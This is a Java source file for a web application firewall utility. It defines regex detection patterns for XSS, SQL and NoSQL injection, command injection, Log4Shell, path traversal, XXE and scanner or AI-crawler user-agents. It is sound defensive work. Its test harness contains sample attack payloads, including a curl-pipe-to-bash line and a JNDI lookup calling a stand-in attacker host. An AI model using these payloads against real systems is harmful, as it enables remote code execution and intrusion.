/*
 * Copyright (C) 2001-2026 JServlet.com Franck Andriano.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public
 * License along with this program.  If not, see
 * <http://www.gnu.org/licenses/gpl-3.0.html>.
 */

package com.jservlet.nexus.shared.web.filter;

import java.util.List;
import java.util.regex.Pattern;

/**
 * Modern WAF defense Utilities. Check for potential evasion inside a query or parameters, headers, cookies and JSON Body!
 * <p>
 * - XSS script injection evasion (various encoding, obfuscation, template injections)<br>
 * - SQL injection (commands, functions, params and NoSQL)<br>
 * - Google injection (GCP/Google Cloud Platform - GCP Metadata server)<br>
 * - Command injection &amp; RCE (Remote code execution)<br>
 * - File injection (LFI/RFI &amp; path traversal)<br>
 * - Java injection (RCE, SSTI &amp; deserialization)<br>
 * - XXE injection (XML External Entity)<br>
 * - Suspicious characters injection (excessive special char, unusual length/structure)<br>
 * - Link injection (mailto or ftp)<br>
 * - User-Agent Automates scanner/analyser<br>
 * - AI User-Agent (Bots Agent, LLM training)<br>
 * </p>
 */
public class WAFUtils {

    private WAFUtils() {
        throw new UnsupportedOperationException("Utility class");
    }

    /**
     * Potential XSS (script injection) evasion. WAF query, params, headers and cookies!
     * Covers various encoding, obfuscation, HTML tags, attributes, and JavaScript execution.
     * Data URIs, SVG/MathML vectors, Vue/AngularJS/React template injections, and deeply obfuscated javascript:
     */
    public static final List<Pattern> XSS_PATTERNS = List.of(
            // Detects obfuscated characters: Unicode escape sequences, Hexadecimal HTML entities, ASCII tag "< 60 0x3C" HTML Car Déc Hex, HTML comment opening hide malicious script
            Pattern.compile("(?si)\\\\u[0-9a-fA-F]{4}|&#x0*[0-9a-fA-F]{2};?|&#[0-9]{2,5};?|\\\\x5cx[0-9a-fA-F]{2}|(?:<|&lt;?|%3C|&#x0*3c;|\\\\u003c)!--"),

            // General XSS payloads: script tags, common event handlers, JavaScript: URIs, data: URIs, HTML entities, various encodings (Unicode, URL, hex), and common JavaScript functions.
            // script|body|html|table|xss|style|bgsound|portal|picture|fencedframe|a|template|track|canvas|video|source|audio|object|embed|applet|i?frame|form|input|option|blockquote|area|map|link|base|layer|div|span|img|meta|math|svg
            Pattern.compile("(?si)(?:<|&lt;?|%3C|&#x0*3c;|\\\\u003c)\\s*(?:script|body|html|xss|style|bgsound|portal|picture|fencedframe|template|track|canvas|video|source|audio|object|embed|applet|i?frame|form|input|option|blockquote|area|map|link|base|layer|div|img|meta|math|svg)(?=\\s|>|/>|$)|" +
            //Pattern.compile("(?si)(?:<|&lt;?|%3C|&#x0*3c;|\\\\u003c)\\s*(?:script|xss|style|bgsound|portal|fencedframe|template|object|embed|applet|i?frame|base|meta|link|math|svg)(?=\\s|>|/>|$)|" +
                    "\\bon(?:afterprint|beforeprint|beforeunload|hashchange|message|offline|line|pagehide|pageshow|popstate|storage|unload|contextmenu|input|invalid|search|mousewheel|wheel|drag|dragenter|dragleave|dragover|dragstart|drop|scroll|copy|cut|paste|abort|blur|change|click|dblclick|error|focus|keydown|keypress|keyup|load|mousedown|mousemove|mouseout|mouseover|mouseup|reset|resize|select|submit|pointerdown|pointerup)\\b\\s*=|" +
                    "\\.cookie\\b|\\b(?:execScript|alert|confirm|prompt|msgbox|eval|expression)\\s*\\(|" +
                    "\\b(?:java|vb)script\\s*[:\\s]|\\bvoid\\s*\\(0\\)|\\bhttp-equiv\\b|\\bfromCharCode\\b|" +
                    "\\.\\s*href\\s*=|\\bgetElements?By(?:Tag)?(?:Name|Id)\\b\\s*\\(|" +
                    "\\bcreate(?:Attribute|Element|TextNode)\\b\\s*\\(|" +
                    "\\.(?:write(?:ln)?|innerHTML|outerHTML|textContent|setAttribute)\\b\\s*[=(]|" +
                    "@import\\b|\\bbackground\\s*=\\s*['\"]|\\bAllowScriptAccess\\b\\s*=|" +
                    "\\bdata:(?:text/html|image/svg\\+xml|application/javascript)\\b|\\{\\{.*\\}\\}")
    );

    /**
     * Potential SQL injection evasion. SQL query commands, functions, params and NoSQL Injection
     */
    public static final List<Pattern> SQL_PATTERNS = List.of(
            Pattern.compile("(?si)'\\s*+(?:;|--|#)|;\\s*+--|\\b(?:or|and)\\s+'?[0-9a-zA-Z]+'?\\s*+=\\s*+'?[0-9a-zA-Z]+'?|'\\s*+(?:or|and|where|not|union)\\b"),
            Pattern.compile("(?si)(?:['\";)]|/\\*|--)\\s*\\b(?:delete\\s+from|update\\s+\\w+\\s+set|insert\\s+into|select\\s+[^;]{1,100}?\\s+from)\\b"),
            Pattern.compile("(?si)\\b(?:union\\s+(?:all\\s+)?select|drop\\s+(?:table|database|user)|create\\s+table|benchmark\\s*\\(|exec\\s+xp_|into\\s+outfile|cmdshell|user_name\\s*\\(|information_schema|waitfor\\s+delay|pg_sleep|dbms_pipe\\.receive_message|sleep\\s*\\()\\b"),
            // NoSQL Injection (MongoDB, CouchDB) often targeting REST JSON APIs
            Pattern.compile("(?si)\"(?:\\$eq|\\$ne|\\$gt|\\$gte|\\$lt|\\$lte|\\$in|\\$nin|\\$exists|\\$type|\\$regex|\\$where)\"\\s*:")
    );

    /**
     * Modern Google / GCP (Google Cloud Platform) Threats &amp; Cloud Dorking
     * SSRF on GCP Metadata server (Critical for Google Cloud hosted apps)
     * Abuse of Google Workspace (Apps Script, Drive) for data exfiltration or Open Redirects
     * Google API Key &amp; Service Account injection/stealing
     * Modern Dorking operators targeting cloud credentials (used in local search abuse)
     */
    public static final List<Pattern> GOOGLE_PATTERNS = List.of(
            // GCP Metadata SSRF Attack (Preventing server from fetching its own cloud credentials)
            Pattern.compile("(?si)(?:metadata\\.google\\.internal|169\\.254\\.169\\.254)(?:/computeMetadata/v1/|/v1/|/beta/)?"),

            // Google Workspace Abuse (Malicious Apps Script / Drive used as Command & Control or Data Exfiltration)
            Pattern.compile("(?si)https?://(?:script\\.google\\.com/macros/s/[a-zA-Z0-9_-]+|drive\\.google\\.com/uc\\?export=download|storage\\.googleapis\\.com/[a-z0-9_.-]+)"),

            // Google API Key & OAuth abuse (Detects 'AIza' API keys or OAuth Client IDs passed anomalously)
            // (WARN Note: If your app legitimately expects users to input Google API keys, remove this specific pattern)
            Pattern.compile("(?s)AIza[0-9A-Za-z-_]{35}|[0-9]+-[0-9a-zA-Z_]{32}\\.apps\\.googleusercontent\\.com"),

            // Modern Google Dorking (Local search abuse or Referer checking)
            Pattern.compile("(?si)\\b(?:inurl|intitle|intext|filetype|ext)\\s*:\\s*(?:env|credentials|service_account|rsa|id_rsa|pem|log|sql|bak|config|htpasswd)\\b")
    );

    /**
     * Command injection &amp; RCE (remote code execution)
     * Linux piping (`|`), backticks, $() execution, and out-of-band network commands (curl, wget, nc).
     */
    public static final List<Pattern> COMMAND_PATTERNS = List.of(
            Pattern.compile("(?si)cmd(?:\\.exe|=dir)|\\.dll|\\buname\\b|cmdshell|format\\s+[CDE]['\"]|#exec|/bin/(?:ls|sh|bash|zsh)|;(/usr)?/s?bin/"),
            Pattern.compile("(?si)(?:\\||&&|;|\\n|\\r|`|\\$\\()\\s*(?:curl|wget|nc|netcat|bash|sh|zsh|powershell|ping|nslookup|dig|awk|sed|python|perl|ruby)\\b")
    );

    /**
     * Modern Java specific RCE (Remote Code Execution), SSTI (templates) &amp; deserialization (Log4Shell, SpEL, OGNL)
     */
    public static final List<Pattern> JAVA_RCE_PATTERNS = List.of(
            // Log4Shell (CVE-2021-44228) and variants
            Pattern.compile("(?si)\\$\\{\\s*(?:jndi|jndi:ldap|jndi:rmi|jndi:dns|jndi:nis|jndi:iiop|jndi:corba|jndi:ndsn|sys|env|lower|upper)\\s*:"),
            // Java Reflection, Runtime execution, and Fastjson/Jackson bypasses
            Pattern.compile("(?si)\\b(?:java\\.lang\\.Runtime|ProcessBuilder|java\\.lang\\.reflect|java\\.io\\.File|java\\.net\\.URL)\\b|@type[\"']?\\s*:|getClass\\(\\)\\.getClassLoader\\(\\)")
    );

    /**
     * Potential file inclusion (LFI/RFI) &amp; path traversal
     * Advanced dot-dot-slash obfuscation (%2e%2e%2f) and PHP/File wrappers (php://, file://)
     */
    public static final List<Pattern> FILE_PATTERNS = List.of(
            Pattern.compile("(?si)/(?:var/log|boot|etc|sbin|root)/|etc/(?:passwd|shadow|init\\.d|users|groups|hosts)|\\.bash_(?:rc|history|profile)|WS_FTP\\.LOG|_notes/.*\\.mno|(?:phpinfo|test)\\.php|(?:web|config|ejb-jar|weblogic|citydesk|contribute)\\.xml|\\.ht(?:access|passwd)|httpd\\.conf|conf\\.d|c:[/\\\\](?:windows|system32|boot\\.ini)"),
            // Advanced Path Traversal (e.g., ../, ..\, %2e%2e%2f)
            Pattern.compile("(?si)(?:\\.{2,}|%2e%2e|%252e%252e)(?:/|\\\\(?!\\\")|%2f|%5c|%252f|%255c)"), // Fix ...\"}
            // LFI/RFI Wrappers
            Pattern.compile("(?si)\\b(?:php|file|zip|dict|expect|ftp|http|https)://(?:filter|input|\\.\\.)")
    );

    /**
     * Potential link injection (reframing?)
     */
    public static List<Pattern> LINK_PATTERNS = List.of(
            Pattern.compile("(?i)mailto:|ftp://")
    );

    /**
     * Potential Xml External Entity (XXE) injection
     * Critical for REST APIs parsing XML payloads or SOAP services.
     */
    public static final List<Pattern> XXE_PATTERNS = List.of(
            Pattern.compile("(?si)<\\!DOCTYPE\\s+[^>]*\\b(?:SYSTEM|PUBLIC)\\b|<\\!ENTITY\\s+[^>]*\\b(?:SYSTEM|PUBLIC)\\b")
    );

    /**
     * Potential embedded XXS File (XML/SVG)
     * Search only tags {@code <script>},  URI javascript/data and event attribute "on*"
     */
    public static final List<Pattern> FILE_XSS_PATTERNS = List.of(
            Pattern.compile("(?si)<\\s*script\\b|\\bjavascript\\s*:|\\bdata\\s*:\\s*(?:text/html|application/javascript)|\\bon[a-z]+\\s*=")
    );

    /**
     * Generic suspicious patterns (e.g., excessive special characters, unusual length/structure)
     */
    public static final List<Pattern> SUSPICIOUS_PATTERNS = List.of(
            Pattern.compile("(?si)(?:[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F]){2,}|" + // Control characters (excluding \t, \n, \r)
                    "\\.{10,}|" + // Excessive dots (e.g., buffer overflows or crazy traversal)
                    "(?:%[0-9a-fA-F]{2}){10,}" // Excessive continuous URL encoding
            )
    );

    /**
     * Potential User-Agent patterns indicating scanners, bots, or malicious activity.
     */
    public static final List<Pattern> USER_AGENT_PATTERNS = List.of(
            Pattern.compile("(?si)(?:acunetix|nikto|sqlmap|nmap|nessus|w3af|openvas|zap|burp(?:suite)?|commix|arachni|netsparker|vega|skipfish|dirbuster|gobuster|ffuf|wfuzz|webinspect|dotdotpwn|havij|xss-proxy|masscan|hydra|medusa|metasploit|nuclei|dirb|wpscan|joomscan|droopescan|whatweb|cmsmap|sn1per|recon-ng|sparta|legion|spiderfoot|osint-framework|dmitry|fierce|dnsenum|dnsrecon|subfinder|assetfinder|waybackurls|gau|katana|hakrawler|paramspider|kxss|dalfox|xss-hunter|bounty-hunter|python-requests|go-http-client|java/\\d+|php/\\d+|ruby/\\d+|perl/\\d+)")
    );

    /**
     * Potential AI Crawler Bots - Blocks scraper bots used for LLM training.
     */
    public static final List<Pattern> AI_USER_AGENT_PATTERNS = List.of(
            Pattern.compile("(?si)(?:GPTBot|OAI-SearchBot|ChatGPT-User|ClaudeBot|anthropic-ai|Google-Extended|Meta-ExternalAgent|FacebookBot|CCBot|Bytespider|Amazonbot|Cohere-ai|Omgilibot|PerplexityBot|Diffbot|ImagesiftBot|YouBot)")
    );

    private static boolean isWAFPattern(String value, List<Pattern> patterns) {
        if (value == null) return false;
        // matcher pattern find ?
        for (Pattern pattern : patterns) {
            if (pattern.matcher(value).find())
                return true;
        }
        return false;
    }


    public static void main(String[] args) {
        // Advanced Test Payloads to verify improvements
        String[] tests = {
                // Basic Html
                "<a>",
                "<a href=\"ok\">",
                "<a onclick=\"bad\">",
                "<a href=\"javascript:alert(1)\">",
                "<script>",
                "</script>",

                // XSS & Template Injection
                "<svg onload=alert(1)>",
                "<video change=\"alert(this.ssss)\">",
                "alert(this.qss)",
                "<body change=\"this.fssf\">",
                "this.1ssss@gmail.com",
                "abort=\"prompt",
                "abort=\"prompt(document.location.href",

                "{{ 7 * 7 }}", // SSTI / Vue
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", // Data URI
                // Java RCE & Deserialization
                "${jndi:ldap://hacker.com/Exploit}",
                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}",
                "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")",
                // NoSQL Injection (JSON body)
                "\"$ne\": 1",
                // OS Command Injection
                "; curl http://hacker.com/shell.sh | bash",
                // Advanced Path Traversal & LFI
                "..%2f..%2f..%2fetc%2fpasswd",
                "php://filter/convert.base64-encode/resource=index.php",
                // XXE
                "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
        };

        System.out.println("--- Advanced WAF Pattern Tests ---");
        for (String test : tests) {
            boolean isCaught = isWAFPattern(test, XSS_PATTERNS) ||
                    isWAFPattern(test, SQL_PATTERNS) ||
                    isWAFPattern(test, COMMAND_PATTERNS) ||
                    isWAFPattern(test, JAVA_RCE_PATTERNS) ||
                    isWAFPattern(test, FILE_PATTERNS) ||
                    isWAFPattern(test, XXE_PATTERNS);

            System.out.printf("Caught: %-5b | Payload: %s%n", isCaught, test);
        }
    }

}
